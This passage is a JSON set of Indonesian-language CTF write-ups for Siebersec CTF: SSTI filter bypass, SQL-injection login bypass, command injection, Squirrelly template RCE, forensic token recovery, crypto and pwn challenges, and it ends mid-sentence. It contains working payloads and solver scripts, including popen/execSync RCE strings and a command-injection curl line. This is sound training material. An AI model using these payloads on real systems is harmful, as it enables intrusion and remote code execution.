cwd=root,\r\n        check=True,\r\n        capture_output=True,\r\n        text=True,\r\n    )\r\n\r\n    output = proc.stdout\r\n    print(output, end=\"\")\r\n\r\n    match = re.search(r\"sctf\\\\{[^}]+\\\\}\", output)\r\n    if not match:\r\n        raise SystemExit(\"flag not found in binary output\")\r\n\r\n    print(f\"\\n[+] license.key = {license_value:016x}\")\r\n    print(f\"[+] flag = {match.group(0)}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{funding_for_this_program_was_made_possible_by_by_by_by_by}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-web-bebehssti",
    "title": "bebeh ssti - SiebersecCTF",
    "ctfName": "Siebersec CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge web ini adalah soal SSTI (Server-Side Template Injection) klasik di Flask/Jinja2.",
    "problemDescription": "Challenge web ini adalah soal SSTI (Server-Side Template Injection) klasik di Flask/Jinja2. Vulnerability-nya ada di `render_template_string` yang nerima input langsung dari parameter `name`.",
    "tools": [],
    "analysis": "Ada blacklist yang cukup rese:\n```python\nbanned = [\n    \"'\", \"\\\"\",\n    'self', 'cycler', 'globals', 'builtins',\n    'os', 'system', 'popen', 'sh', 'cat'\n]\n```\nKarakter kutip (`'` dan `\"`) dibanned, jadi kita nggak bisa masukin string langsung. Selain itu, keyword penting buat RCE kayak `globals`, `os`, `popen`, dll juga dibanned. Tapi, pengecekannya cuma dilakuin ke parameter `name`.",
    "solution": [
      {
        "title": "Exploitation",
        "content": "Strategi bypass-nya simpel:\n1. Pake `request.args` buat passing string yang dibanned lewat parameter lain.\n2. Gunakan `attr` filter buat akses attribute.\n3. Karena `.` (titik) kadang bermasalah kalau digabung sama fungsi, kita pake `__getitem__` buat akses dictionary.\n\nSetelah ngulik `lipsum.__globals__`, ternyata modul `os` udah ke-import di sana. Jadi kita tinggal panggil.\n\nPayload final buat baca flag:\n\n\nDetail parameter:\n- `g=__globals__`\n- `gi=__getitem__`\n- `o=os`\n- `p=popen`\n- `c=head /flag.txt` (Pake `head` karena `cat` dibanned)\n- `r=read`\n\nFlag ketemu di `/flag.txt`.\n\n<FLAG>sctf{h3s_ju5t_4_bebeh}</FLAG>",
        "code": "/?name={{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}&g=__globals__&gi=__getitem__&o=os&p=popen&c=head /flag.txt&r=read"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{h3s_ju5t_4_bebeh}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-web-cpstore",
    "title": ": CP Store",
    "ctfName": "Siebersec CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini melibatkan eksploitasi pada aplikasi Node.js yang menggunakan MySQL sebagai database.",
    "problemDescription": "Challenge ini melibatkan eksploitasi pada aplikasi Node.js yang menggunakan MySQL sebagai database. Terdapat dua kerentanan utama yang digunakan untuk mendapatkan flag: **SQL Injection via Type Confusion** pada proses login dan **Logic Flaw** pada sistem voucher diskon.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. SQL Injection (mysql2 Object Injection)",
        "content": "Pada file `routes/auth.js`, proses login menggunakan `db.query` dengan placeholder `?`. Namun, aplikasi menggunakan `express.urlencoded({ extended: true })`, yang memungkinkan pengiriman objek melalui body request.\n\nLibrary `mysql2` memiliki fitur (atau perilaku) di mana jika sebuah objek dilewatkan ke placeholder `?`, ia akan diserialisasi menjadi format `key = value`. Dengan mengirimkan `password[password]=1`, query akan berubah menjadi:\n`SELECT * FROM users WHERE username = 'techie_ernie67' and password = password = 1 LIMIT 1`\nDalam MySQL, `password = password` bernilai `true` (selama tidak NULL), dan `true = 1` juga bernilai `true`. Hal ini memungkinkan bypass login tanpa mengetahui password asli user `techie_ernie67`.",
        "code": "const [rows] = await db.query(\n  \"SELECT * FROM users WHERE username = ? and password = ? LIMIT 1\",\n  [username, password]\n);"
      },
      {
        "title": "2. Discount Logic Flaw",
        "content": "Setelah login, user memiliki saldo default 100. Item `FLAG` berharga 1000. Terdapat fitur untuk mendapatkan voucher diskon 10% (`0.1`). \nDi `routes/cart.js`, total harga dihitung dengan menjumlahkan semua diskon yang ada di session:\n\nKarena kita bisa meminta voucher baru berkali-kali (`/voucher/issue`), kita bisa mengumpulkan 10 voucher unik (karena ada klaim `iat` di JWT) untuk mendapatkan diskon total 100% (`1.0`), sehingga harga `FLAG` menjadi 0.",
        "code": "const discount = Object.values(req.session?.vouchers ?? {}).reduce((sum, discount) => sum + discount, 0);\n// ...\ntotal *= 1 - Math.min(discount, 1);"
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "1. **Login Bypass**: Kirimkan POST request ke `/login` dengan body `username=techie_ernie67&password[password]=1`. Ambil session cookie-nya.\n2. **Add to Cart**: Tambahkan item FLAG (ID 6) ke dalam keranjang.\n3. **Generate Vouchers**: Kunjungi `/voucher/issue` sebanyak 10 kali untuk mendapatkan 10 kode voucher unik.\n4. **Apply Vouchers**: Masukkan 10 voucher tersebut melalui POST `/voucher/apply`.\n5. **Checkout**: Lakukan checkout. Karena diskon 100%, saldo tidak akan berkurang.\n6. **Get Flag**: Lihat di `/inventory` untuk mengambil flag-nya.\n\nFlag ditemukan: `sctf{h1_iM_3rn13_But_y0u_c4n_c4LL_M3_t3chiE_3rNie}`"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import requests\r\nimport time\r\nimport re\r\n\r\nBASE_URL = \"http://chal.sieberr.live:22003\"\r\n# Use the cookie from the previous successful login\r\nCOOKIES = {\"connect.sid\": \"s%3AzhklAcTdyfpXqbkZIkFlya44EHBktIp6.r8UT5nwJdVz62uXjDOCg7h76nbjT5zpqrBQHTzQETxc\"}\r\n\r\ndef add_to_cart(item_id):\r\n    print(f\"[*] Adding item {item_id} to cart...\")\r\n    r = requests.post(f\"{BASE_URL}/cart/add\", cookies=COOKIES, data={\"item_id\": item_id})\r\n    print(f\"    Response: {r.text}\")\r\n\r\ndef get_voucher():\r\n    print(\"[*] Issuing a new voucher...\")\r\n    r = requests.get(f\"{BASE_URL}/voucher/issue\", cookies=COOKIES)\r\n    # Extract voucher from the page\r\n    # <div class=\"voucher-code\" id=\"voucherCode\">...</div>\r\n    match = re.search(r'id=\"voucherCode\">(.*?)</div>', r.text)\r\n    if match:\r\n        return match.group(1)\r\n    return None\r\n\r\ndef apply_voucher(voucher):\r\n    print(f\"[*] Applying voucher: {voucher[:20]}...\")\r\n    r = requests.post(f\"{BASE_URL}/voucher/apply\", cookies=COOKIES, data={\"voucher\": voucher})\r\n    print(f\"    Response: {r.text}\")\r\n\r\ndef checkout():\r\n    print(\"[*] Checking out...\")\r\n    r = requests.post(f\"{BASE_URL}/cart/checkout\", cookies=COOKIES)\r\n    print(f\"    Response: {r.text}\")\r\n\r\ndef get_inventory():\r\n    print(\"[*] Checking inventory...\")\r\n    r = requests.get(f\"{BASE_URL}/inventory\", cookies=COOKIES)\r\n    return r.text\r\n\r\ndef main():\r\n    # 1. Add FLAG to cart\r\n    add_to_cart(6)\r\n\r\n    # 2. Get 10 unique vouchers\r\n    vouchers = []\r\n    for i in range(10):\r\n        v = get_voucher()\r\n        if v:\r\n            vouchers.append(v)\r\n            print(f\"    Got voucher {i+1}/10\")\r\n            # Wait a bit to ensure unique 'iat' if needed, though JWT might be unique anyway\r\n            time.sleep(1.1) \r\n        else:\r\n            print(\"    Failed to get voucher\")\r\n\r\n    # 3. Apply all vouchers\r\n    for v in vouchers:\r\n        apply_voucher(v)\r\n\r\n    # 4. Checkout\r\n    checkout()\r\n\r\n    # 5. Get Flag\r\n    inventory = get_inventory()\r\n    # Find the flag in the inventory page\r\n    # <div class=\"secret\">...</div>\r\n    match = re.search(r'<div class=\"secret\">(.*?)</div>', inventory)\r\n    if match:\r\n        print(f\"\\n[+] FLAG FOUND: {match.group(1)}\")\r\n    else:\r\n        print(\"\\n[-] Flag not found in inventory.\")\r\n        print(inventory)\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{h1_iM_3rn13_But_y0u_c4n_c4LL_M3_t3chiE_3rNie}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-web-pinger",
    "title": "Pinger",
    "ctfName": "Siebersec CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Vulnerability: **Command Injection** lewat **Array Parameter Bypass**.",
    "problemDescription": "Vulnerability: **Command Injection** lewat **Array Parameter Bypass**.",
    "tools": [],
    "analysis": "Aplikasi Node.js ini gunain `child_process.exec` buat ngejalanin command `ping`. Ada filter karakter yang cukup ketat di variabel `url`:\n```javascript\nfor (const c of \";()\\`|&$ \\t\\n\\r\") {\n  if (url.includes(c)) {\n      return res.render(\"index\", { output: null, error: \"Contraband detected!\" })\n  }\n}\n```\nTapi, filter ini cuma efektif kalo `url` itu string. Karena aplikasi ini pake Express, kita bisa ngirim `url` sebagai **Array** dengan cara ngirim query param yang sama berkali-kali (`?url=...&url=...`).\n\nKalo `url` itu Array, method `url.includes(c)` bakal ngecek apakah ada salah satu elemen di array yang **sama persis** sama karakter `c`. Jadi kalo kita kirim `;cat<flag.txt`, pengecekan bakal return `false` karena string `;cat<flag.txt` gak sama persis sama `;`.\n\nWaktu Array ini dimasukin ke template literal:\n```javascript\nexec(`ping -c 1 -W 2 ${url}`, ...)\n```\nNode.js bakal otomatis nge-join array tadi pake koma (`,`). Command yang dieksekusi jadi:\n`ping -c 1 -W 2 127.0.0.1,;cat<flag.txt`\n\nDi shell (`sh`), `;` itu command separator. Jadi shell bakal nyoba ping `127.0.0.1,` (bakal gagal), terus lanjut ngejalanin `cat<flag.txt`.",
    "solution": [
      {
        "title": "Eksploitasi",
        "content": "Kirim request dengan parameter `url` ganda:\n\n\nFlag: `sctf{f3ll_f0r_tHe_h3si}`",
        "code": "curl \"http://chal.sieberr.live:22002/?url=127.0.0.1&url=;cat<flag.txt\""
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{f3ll_f0r_tHe_h3si}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-web-today",
    "title": "Today",
    "ctfName": "Siebersec CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Siebersec CTF 2026 Writeup — Web / Today",
    "problemDescription": "Tantangan today menyajikan studi kasus menarik tentang bagaimana pertahanan berbasis daftar hitam (blacklist) terhadap celah Prototype Pollution dapat dilewati sepenuhnya menggunakan kelemahan logika dasar dalam penanganan properti bawaan objek (native properties) dan perbandingan longgar (loose comparison) di JavaScript (Node.js).",
    "tools": [
      "Squirrelly"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Analisis Autentikasi (app.js)",
        "content": "Aplikasi web ini dibangun menggunakan framework Express dengan template engine Squirrelly (v9.1.0) dan library utilitas uni-flatten (v1.7.1). Proses login menggunakan `db.query` dengan pencarian properti dan operator `!=`:",
        "code": "const users = {\n  'admin': crypto.randomBytes(32).toString('hex')\n};\n\napp.get(\"/\", (req, res) => {\n  const { username, password } = unflatten(req.query);\n\n  if (users[username] === undefined || users[username] != password) {\n    return res.status(500).json({ 'error': 'Invalid credentials' });\n  }\n\n  return res.render('index', req.query);\n});"
      },
      {
        "title": "Kerentanan 1: Pewarisan Properti Objek & Loose Comparison",
        "content": "Kelemahan fatal terletak pada cara aplikasi memvalidasi kredensial pengguna:\n\nif (users[username] === undefined || users[username] != password)\n\n\nPewarisan Objek: users diinisialisasi sebagai objek literal biasa ({}). Oleh karena itu, objek ini secara otomatis mewarisi semua properti dan metode bawaan dari Object.prototype, seperti toString, valueOf, hasOwnProperty, dll.\n\nAkses Properti: Jika kita menyuplai username=toString, maka users['toString'] tidak akan menghasilkan undefined. Ekspresi tersebut akan mengevaluasi metode bawaan objek:\n\nusers['toString'] === [Function: toString]\n\n\nLoose Inequality Bypass: Kondisi kedua membandingkan fungsi tersebut dengan input string password kita menggunakan operator != (perbandingan longgar/tidak ketat).\nDi JavaScript, ketika sebuah fungsi dibandingkan dengan string menggunakan operator perbandingan longgar, JavaScript akan secara otomatis memanggil metode .toString() pada objek fungsi tersebut sebelum melakukan perbandingan.\nRepresentasi string dari fungsi asli toString di Node.js adalah:\n\n\"function toString() { [native code] }\"\n\n\nDengan mengirimkan:\n\nusername = toString\n\npassword = function toString() { [native code] }\n\nMaka evaluasi kondisinya menjadi:\n\nusers['toString'] != \"function toString() { [native code] }\"\n// Menjadi:\n\"function toString() { [native code] }\" != \"function toString() { [native code] }\"\n// Hasilnya: false!\n\n\nKarena kondisi if bernilai false, pemeriksaan login berhasil dilewati sepenuhnya tanpa perlu memecahkan Prototype Pollution!"
      },
      {
        "title": "Kerentanan 2: Server-Side Template Injection (SSTI) di Squirrelly",
        "content": "Setelah login berhasil dilewati, seluruh objek req.query dikirimkan secara mentah sebagai parameter opsi ke fungsi render Express:\n\nreturn res.render('index', req.query);\n\n\nSquirrelly v9.1.0 mengompilasi template HTML secara dinamis dan rentan terhadap injeksi kode melalui opsi render defaultFilter. Ketika Squirrelly mendeteksi adanya opsi defaultFilter, ia akan menggabungkan nilainya langsung ke dalam tubuh fungsi kompilasi JavaScript yang dihasilkan tanpa melakukan sanitasi string.\n\nDengan menyuplai parameter defaultFilter langsung di dalam query string, kita dapat mengeksekusi perintah sistem operasi (RCE) dengan menggunakan modul child_process."
      },
      {
        "title": "Memicu Eksekusi RCE & Membaca Output Flag",
        "content": "Kita mengirimkan request pertama untuk melewati login via bypass toString sekaligus mengirimkan payload defaultFilter untuk menimpa file index.sqrl dengan isi flag.txt, lalu panggil ulang request tersebut untuk merender isi flag-nya:",
        "code": "curl -G \"http://47039f4b-8ee8-4524-9470-3d51c2fde3d3.chal.sieberr.live:8080/\" \\\n  --data-urlencode \"username=toString\" \\\n  --data-urlencode \"password=function toString() { [native code] }\" \\\n  --data-urlencode \"defaultFilter=e'));global.process.mainModule.require('child_process').execSync('cat flag.txt > views/index.sqrl')//\""
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{wh4t_c0m3s_Aft3R_t0d4y???THr33d4y!!!}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-",
    "title": "バカ通信",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "SiebersecCTF",
    "tags": [],
    "description": "File yang dikasih cuma satu image EWF:",
    "problemDescription": "File yang dikasih cuma satu image EWF:\n\n```bash\nrtk file idiot_communication.E01\n```\n\nHasilnya EnCase/FTK image. Setelah di-mount lewat `ewfmount`, volume di dalamnya ternyata satu NTFS dan ada user `John Rich`.\n\n```bash\nmkdir -p ewf\nrtk ewfmount idiot_communication.E01 ewf\nrtk fsstat ewf/ewf1 | head\nrtk fls ewf/ewf1 10411\n```\n\nTarget challenge bilang kredensial GitHub ada di device ini, jadi fokusnya ke profil user. Repo di `Documents/repos/NOTTheFlag` cuma decoy. Yang kepakai justru file terhapus dari profil user.\n\n```bash\nmkdir -p recovered_user\nrtk tsk_recover -e -d 10516 ewf/ewf1 recovered_user\n```\n\nSetelah recovery, cari token GitHub:\n\n```bash\npython3 - <<'PY'\nfrom pathlib import Path\nfor p in Path('recovered_user').rglob('*'):\n    if p.is_file() and p.stat().st_size < 5_000_000:\n        try:\n            data = p.read_bytes()\n        except Exception:\n            continue\n        for needle in [b'github_pat_', b'ghp_']:\n            if needle in data:\n                print(p)\n                break\nPY\n```\n\nHit penting muncul di cache WebView:\n\n```text\nrecovered_user/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState/EBWebView/Default/Cache/Cache_Data/data_1\n```\n\nExtract string di file itu:\n\n```bash\nstrings -a recovered_user/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/LocalState/EBWebView/Default/Cache/Cache_Data/data_1 | grep github_pat_\n```\n\nKeluar token PAT GitHub utuh. Token itu ternyata pernah diketik ke Bing search, jadi kesimpan di cache request URL.\n\nValidasi token ke GitHub API:\n\n```bash\nTOKEN='github_pat_...redacted...'\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  https://api.github.com/user\n```\n\nLanjut list repo private milik akun itu:\n\n```bash\ncurl -s -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Accept: application/vnd.github+json\" \\\n  'https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100'\n```\n\nAda repo private `idiot-communication`, dan field `description` langsung berisi flag:\n\n```text\n\"description\": \"sctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}\"\n```\n\nFlag:\n\n```text\nsctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}\n```",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "sctf{0n1y_4n_idi0t_1s_th1s_uns3cur3}",
    "lessonsLearned": ""
  },
  {
    "id": "siebersecctf-crypto-thinkingspaceii-dist",
    "title": ": Thinking Space II (Crypto Challenge - SiebersecCTF)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "SiebersecCTF",
    "tags": [],
    "description": "Writeup: Thinking Space II (Crypto Challenge - SiebersecCTF)",
    "problemDescription": "Writeup: Thinking Space II (Crypto Challenge - SiebersecCTF)\n\nTantangan kriptografi Thinking Space II adalah sebuah jebakan (red herring) klasik. Meskipun diberikan file uov.py yang berisi implementasi skema kriptografi Unbalanced Oil and Vinegar (UOV) pasca-kuantum sepanjang ratusan baris, kerentanan sebenarnya tidak ada hubungannya dengan kelemahan matematis algoritma tersebut. Celahnya murni berada pada penanganan tipe data di Python 3.\n\n1. Analisis Kerentanan (Type Confusion)\n\nMari kita bedah file eksekusi utama chall.py:\n\nthought = b'I am thinking of the flag'\nprint(pk.hex())\n\nmsg = input('msg: ')\nassert msg != thought\nprint(uov.sign(msg.encode(),sk,pk).hex())\n\n\nTerdapat dua mekanisme krusial di sini:\n\nVariabel thought dideklarasikan secara eksplisit sebagai tipe data bytes (ditandai dengan prefiks b'').\n\nProgram meminta input dari pengguna menggunakan fungsi bawaan input(). Di Python 3, fungsi input() selalu mengembalikan tipe data string (str), terlepas dari apa pun yang kita ketik.\n\nKetika program menjalankan baris assert msg != thought, Python membandingkan objek str dengan objek bytes. Karena kedua tipe data ini berbeda secara fundamental dalam arsitektur Python 3, perbandingan \"I am thinking of the flag\" != b\"I am thinking of the flag\" akan selalu dievaluasi sebagai True.\n\nBerkat type confusion ini, asersi keamanan berhasil dilewati. Setelah lolos, program menjalankan msg.encode() yang mengubah string kita kembali menjadi bytes, yang mana isinya sekarang identik $100\\%$ dengan variabel thought. Server pun dengan senang hati membuatkan tanda tangan digital asli untuk kita.\n\n2. Alur Eksploitasi\n\nEksploitasi dapat dilakukan secara sangat sederhana tanpa perlu membongkar algoritma UOV:\n\nBypass PoW: Selesaikan Proof of Work standar menggunakan skrip curl yang disediakan.\n\nKumpulkan Public Key: Simpan Public Key (pk) yang dicetak pertama kali oleh server.\n\nPicu Type Confusion: Saat server meminta input msg: , kita cukup mengetikkan string yang sama persis dengan target:\nI am thinking of the flag\nKarena input ini adalah string, ia lolos dari blokade assert.\n\nTangkap Tanda Tangan: Server akan merespons dengan mencetak signature dalam format hex untuk pesan kita.\n\nVerifikasi Flag: Saat server beralih ke blok kode verifikasi dan meminta sig: , kita berikan kembali string hex signature yang baru saja kita dapatkan.\n\nServer memverifikasi tanda tangan tersebut terhadap kunci publik dan pesan thought. Karena valid, server membuka dan memberikan isi flag.txt.\n\n3. Skrip Otomatisasi (solve.py)\n\nBerikut adalah skrip menggunakan pwntools yang secara otomatis membongkar sistem PoW (menggunakan modul subprocess untuk eksekusi bash) dan mengeksploitasi celah type mismatch dalam hitungan detik:\n\nfrom pwn import *\nimport subprocess\n\ndef solve():\n    p = remote('chal.sieberr.live', 20003)\n\n    # 1. Bypass Proof of Work (PoW)\n    p.recvuntil(b'Run the following command and input the solution below to solve the proof-of-work:\\n')\n    cmd = p.recvline().strip().decode()\n    \n    # Eksekusi command PoW secara otomatis lewat bash\n    pow_solution = subprocess.check_output(cmd, shell=True, executable='/bin/bash').strip()\n    \n    p.sendlineafter(b'> ', pow_solution)\n    p.recvuntil(b'Press enter to proceed to the challenge')\n    p.sendline(b'')\n    \n    # 2. Ambil Public Key\n    pk_hex = p.recvline().strip()\n    \n    # 3. Bypass Type Mismatch (Kirim sebagai String/Bytes mentah yang akan dibaca sebagai String oleh input())\n    payload = b'I am thinking of the flag'\n    p.sendlineafter(b'msg: ', payload)\n    \n    # 4. Tangkap Tanda Tangan Hasil Penipuan\n    sig_hex = p.recvline().strip()\n    \n    # 5. Kirim kembali Tanda Tangan dan Dapatkan Flag\n    p.sendlineafter(b'sig: ', sig_hex)\n    flag = p.recvline().strip()\n    \n    log.success(f\"FLAG DITEMUKAN: {flag.decode()}\")\n    p.close()\n\nif __name__ == '__main__':\n    solve()\n\n\nFlag: sctf{one_who_thinks_all_the_time_has_nothing_to_think_about_except_thoughts}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nimport subprocess\r\n\r\ndef solve():\r\n    p = remote('chal.sieberr.live', 20003)\r\n\r\n    # 1. Bypass Proof of Work (PoW)\r\n    p.recvuntil(b'Run the following command and input the solution below to solve the proof-of-work:\\n')\r\n    cmd = p.recvline().strip().decode()\r\n    log.info(f\"PoW Command: {cmd}\")\r\n    \r\n    log.info(\"Sedang menyelesaikan PoW (membutuhkan beberapa detik)...\")\r\n    # Mengeksekusi command PoW secara langsung lewat bash\r\n    pow_solution = subprocess.check_output(cmd, shell=True, executable='/bin/bash').strip()\r\n    \r\n    p.sendlineafter(b'> ', pow_solution)\r\n    p.recvuntil(b'Press enter to proceed to the challenge')\r\n    p.sendline(b'')\r\n    \r\n    # 2. Ambil Public Key\r\n    pk_hex = p.recvline().strip()\r\n    log.info(\"Public Key UOV diterima.\")\r\n    \r\n    # 3. Bypass Type Mismatch\r\n    # String 'msg' tidak akan pernah dianggap sama dengan Bytes 'thought'\r\n    payload = b'I am thinking of the flag'\r\n    p.sendlineafter(b'msg: ', payload)\r\n    \r\n    # 4. Tangkap Tanda Tangan\r\n    sig_hex = p.recvline().strip()\r\n    log.success(\"Berhasil mengelabui server untuk menandatangani pesan rahasia!\")\r\n    \r\n    # 5. Kirim kembali Tanda Tangan dan Dapatkan Flag\r\n    p.sendlineafter(b'sig: ', sig_hex)\r\n    \r\n    flag = p.recvline().strip()\r\n    log.success(f\"FLAG DITEMUKAN: {flag.decode()}\")\r\n    \r\n    p.close()\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{one_who_thinks_all_the_time_has_nothing_to_think_about_except_thoughts}",
    "lessonsLearned": ""
  },
  {
    "id": "siebersecctf-misc-trojanhorsepower-dist",
    "title": "Trojan Horsepower",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "SiebersecCTF",
    "tags": [],
    "description": "Writeup for challenge Trojan Horsepower",
    "problemDescription": "",
    "tools": [],
    "analysis": "The challenge provides a text classification service that uses an ONNX model to categorize documents. The goal is to trigger the `APPROVED_STABLE_SECRET` class with a confidence of at least 0.999.",
    "solution": [
      {
        "title": "Initial Reconnaissance",
        "content": "- `server.py` reveals a preprocessing pipeline: normalization, leetspeak replacement, horse synonym replacement, and sentence shuffling.\n- The model is a very small ONNX file (2.6KB).\n- Probing the model behaviorally shows it mostly behaves like a Bag of Words (BoW) model for common classes.\n- However, the `APPROVED_STABLE_SECRET` class seems to have no single-token triggers."
      },
      {
        "title": "Deep Dive into the Model",
        "content": "By inspecting the ONNX model's structure (using `strings` and direct protobuf parsing), we discovered a \"Trojan\" mechanism:\n1. The model slices the first 8 tokens of the input.\n2. It compares this slice to a target sequence of 8 integers using an `Equal` operation.\n3. It uses `ReduceProd` to ensure ALL 8 tokens match exactly.\n4. If they match, it adds a large value (`80.0`) to the secret class logit.\n5. Any non-PAD tokens beyond the first 8 positions incur a heavy \"tail penalty,\" subtracting from the secret class logit."
      },
      {
        "title": "Finding the Trigger",
        "content": "We scanned the `model.onnx` binary for sequences of 8-byte integers (64-bit) that fall within the vocabulary range. At offset 976, we found the sequence: `(6, 25, 7, 54, 9, 10, 28, 8)`.\n\nMapping these IDs back to tokens using `tokenizer.json`:\n- 6: `oats`\n- 25: `invoice`\n- 7: `bridle`\n- 54: `mango`\n- 9: `pasture`\n- 10: `hoof`\n- 28: `delta`\n- 8: `saddle`\n\nThe trigger phrase is: `oats invoice bridle mango pasture hoof delta saddle`."
      },
      {
        "title": "Exploitation",
        "content": "Submitting this exact 8-token phrase to the service triggers the secret class with 1.0 confidence, revealing the flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import socket\r\n\r\ndef solve():\r\n    host = \"chal.sieberr.live\"\r\n    port = 23002\r\n    \r\n    phrase = \"oats invoice bridle mango pasture hoof delta saddle\\n\"\r\n    \r\n    with socket.create_connection((host, port)) as s:\r\n        # Read banner\r\n        banner = s.recv(1024).decode()\r\n        print(banner)\r\n        \r\n        # Send phrase\r\n        s.sendall(phrase.encode())\r\n        \r\n        # Read response\r\n        response = s.recv(1024).decode()\r\n        print(response)\r\n        \r\n        if \"sctf{\" in response:\r\n            import re\r\n            flag = re.search(r\"sctf\\{.*\\}\", response).group(0)\r\n            print(f\"FOUND FLAG: {flag}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{tokenizers_are_part_of_the_attack_surface}",
    "lessonsLearned": ""
  },
  {
    "id": "siebersecctf-pwn-canaryisland-dist",
    "title": ": CanaryIsland (Pwn Challenge - SiebersecCTF)",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "SiebersecCTF",
    "tags": [],
    "description": "Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)",
    "problemDescription": "Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)\n\nDokumen ini merangkum analisis kerentanan, struktur memori, dan strategi eksploitasi yang berhasil digunakan untuk menembus tantangan pwn CanaryIsland.\n\n1. Informasi Biner & Mitigasi Keamanan\n\nSebelum melangkah ke eksploitasi, pemeriksaan awal terhadap biner chal menunjukkan konfigurasi proteksi yang sangat ketat:\n\nArch: amd64-64-little (64-bit)\n\nRELRO: Full RELRO (Global Offset Table bersifat read-only, mencegah GOT overwrite)\n\nStack: Canary found (Mencegah modifikasi langsung pada return address tanpa bypass)\n\nNX: NX enabled (Stack tidak dapat dieksekusi, membutuhkan ROP)\n\nPIE: PIE enabled (Posisi biner acak di memori akibat pengaruh ASLR)\n\n2. Analisis Kerentanan (Vulnerability Analysis)\n\nMelalui bedah kode menggunakan analisis statis (reverse engineering), ditemukan dua titik kerentanan utama yang saling berkaitan di dalam fungsi main:\n\nA. Format String Vulnerability (Information Leak)\n\nProgram mencetak input nama pengguna secara langsung menggunakan fungsi printf tanpa menggunakan format penentu (format specifier):\n\nlea rax, [format]\nmov rdi, rax\ncall sym.imp.printf  ; Ekivalen dengan printf(format)\n\n\nKarena parameter dikontrol sepenuhnya oleh pengguna, kita bisa menyisipkan penentu format seperti %p untuk membocorkan nilai registers dan stack memori. Ini adalah kunci untuk melewati proteksi Canary dan ASLR (mencari alamat basis Libc).\n\nB. Integer Underflow & Stack Buffer Overflow\n\nProgram meminta ukuran alokasi memori melalui fungsi get_int() dan membatasi input maksimal sebesar 0x4f ($79$ desimal) menggunakan tipe data bertanda (signed integer):\n\ncall sym.get_int\ncmp dword [var_a4h], 0x4f\njg 0x12f6  ; Jika nilai input > 79, program melompat melewati fgets\n\n\nJika kita memasukkan nilai negatif seperti -1, kondisi jg (Jump if Greater) tidak akan terpenuhi karena $-1 < 79$.\n\nNamun, sesaat sebelum fungsi fgets dipanggil untuk membaca payload, program melakukan konversi nilai tersebut menggunakan instruksi movzx (Move with Zero-Extend) dari register 16-bit (ax) ke register 32-bit (ecx):\n\nmov eax, dword [var_a4h]\nmovzx ecx, ax  ; Nilai -1 (0xffffffff) dikonversi mengambil 16-bit bawah menjadi 0xffff (65535)\nmov esi, ecx   ; Memasukkan ukuran baru ke dalam argumen size fgets\ncall sym.imp.fgets\n\n\nInstruksi movzx mengubah nilai -1 menjadi 65535. Karena kapasitas buffer s di stack hanya dialokasikan sebesar $88$ byte (dari alamat rbp-0x60 ke posisi Canary di rbp-0x8), batas baca 65535 byte dari fgets memberikan kita celah Stack-based Buffer Overflow yang sangat besar untuk mengontrol Return Address (RIP).\n\n3. Strategi Eksploitasi (Exploit Strategy)\n\nLangkah 1: Membocorkan Canary & Alamat Libc\n\nBerdasarkan visualisasi tata letak stack memori:\n\nVariabel input format berada pada posisi rbp-0xa0.\n\nJarak dari format ke Canary (rbp-0x8) adalah $0\\text{xa0} - 0\\text{x8} = 0\\text{x98}$ byte ($152$ desimal), yang setara dengan $19$ slot stack 64-bit.\n\nMengingat pemetaan argumen printf pada arsitektur 